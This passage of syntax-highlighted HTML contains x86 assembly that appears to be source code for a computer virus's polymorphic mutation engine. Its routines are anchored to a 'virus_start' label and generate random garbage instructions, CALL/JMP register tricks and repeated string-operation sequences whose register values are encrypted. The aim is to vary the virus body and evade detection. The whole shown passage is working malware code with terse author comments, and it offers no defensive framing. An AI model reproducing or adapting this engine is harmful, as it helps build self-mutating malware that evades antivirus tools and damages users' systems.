        </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">e_call_reg32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; now, write CALL reg32 instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0D0FFh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">f_call_reg32</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;rnd_block length</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_gen_rnd_fill</span><span class="sc0">    </span><span class="sc1">;ecx is full</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">f_call_reg32</span><span class="sc0">

        </span><span class="sc1">; and we must put value from stack via POP reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">    </span><span class="sc1">;uaaahh...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">f_call_reg32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; restore used_regs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">a_call_reg32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate reg32 + jump reg32 + rnd_block ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_jump_reg32</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_full</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc1">; write CALL reg32 garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">b_call_reg32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_jump_reg32</span><span class="sc0">

        </span><span class="sc1">; rewrite CALL reg32 --&gt; JMP reg32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">g_cr32_jump</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">    </span><span class="sc1">;CALL reg32 -&gt; JMP reg32</span><span class="sc0">

</span><span class="sc5">a_jump_reg32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate rep/repnz + cmps/lods/stos/scas/movs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Welcome to my popular function. I think any comment is</span><span class="sc0">
        </span><span class="sc1">;needless - because this function is easy to understand.</span><span class="sc0">
        </span><span class="sc1">;So, If u don't believe me, I'll show you some functionz:</span><span class="sc0">
        </span><span class="sc1">;  * __gr_make_esi   ---   generate source</span><span class="sc0">
        </span><span class="sc1">;  * __gr_make_edi   ---   generate destination or source</span><span class="sc0">
        </span><span class="sc1">;  * __gr_make_ecx   ---   generate counter</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;...easy to understand...</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_repeat</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; test, if global index register is generated</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; i must be far then about USED_MEMORY bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; register ECX must be free</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; does ESI free ?</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gr_part_2</span><span class="sc0">

        </span><span class="sc1">; does EDI free ?</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gr_lods</span><span class="sc0">

        </span><span class="sc1">; all cmps/lods/stos/scas/movs, wow !</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_repeat</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_repeat</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_repeat</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">a_repeat</span><span class="sc0">

    </span><span class="sc5">__gr_part_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; must be EDI free ...</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_repeat</span><span class="sc0">

        </span><span class="sc1">; only stos/scas ....</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gr_stos</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gr_scas</span><span class="sc0">

    </span><span class="sc5">__gr_cmps</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_esi</span><span class="sc0">       </span><span class="sc1">;new esi to ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_edi</span><span class="sc0">       </span><span class="sc1">;new edi to ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_change</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000110b</span><span class="sc0">        </span><span class="sc1">;esi register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">        </span><span class="sc1">;edi register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">      </span><span class="sc1">;ecx register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">       </span><span class="sc1">;rep or repnz ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A6h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_lods</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; register EAX must be free</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gr_flods</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000110b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ACh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10111111b</span><span class="sc0">
    </span><span class="sc5">__gr_flods</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_stos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01111111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_scas</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_edi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AEh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01111111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_movs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_change</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">000000110b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">000000111b</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_fix_delta</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_make_rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A4h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_make_rep</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0F2F3h</span><span class="sc0">       </span><span class="sc1">;repnz, rep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gr_make_repnz</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">__gr_make_repnz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_crypt_ecx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">        </span><span class="sc1">;ecx register</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gr_make_esi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000Ah</span><span class="sc0">       </span><span class="sc1">;esi start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
